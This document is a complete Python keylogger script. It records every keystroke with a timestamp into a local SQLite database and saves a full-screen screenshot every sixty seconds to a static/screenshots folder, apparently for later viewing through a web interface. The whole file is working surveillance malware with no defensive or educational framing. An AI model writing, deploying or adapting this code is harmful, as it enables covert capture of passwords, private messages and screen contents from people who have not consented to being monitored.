from pynput import keyboard
import sqlite3
import pyautogui
import time
import threading

# Database setup
def setup_database():
    conn = sqlite3.connect("logger.db")
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
                      id INTEGER PRIMARY KEY AUTOINCREMENT,
                      timestamp TEXT,
                      key TEXT)''')
    conn.commit()
    conn.close()

def log_key(key):
    try:
        conn = sqlite3.connect("logger.db")
        cursor = conn.cursor()
        cursor.execute("INSERT INTO logs (timestamp, key) VALUES (datetime('now'), ?)", (key,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Database error:", e)

# Keylogger function
def on_press(key):
    try:
        log_key(str(key.char))  # Normal keys
    except AttributeError:
        log_key(str(key))  # Special keys

# Capture screenshots periodically
def capture_screenshots():
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save(f"static/screenshots/{int(time.time())}.png")
        time.sleep(60)  # Capture every 60 seconds

# Start keylogger
def start_keylogger():
    setup_database()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Start screenshot thread
    screenshot_thread = threading.Thread(target=capture_screenshots, daemon=True)
    screenshot_thread.start()
    
    listener.join()

if __name__ == "__main__":
    start_keylogger()
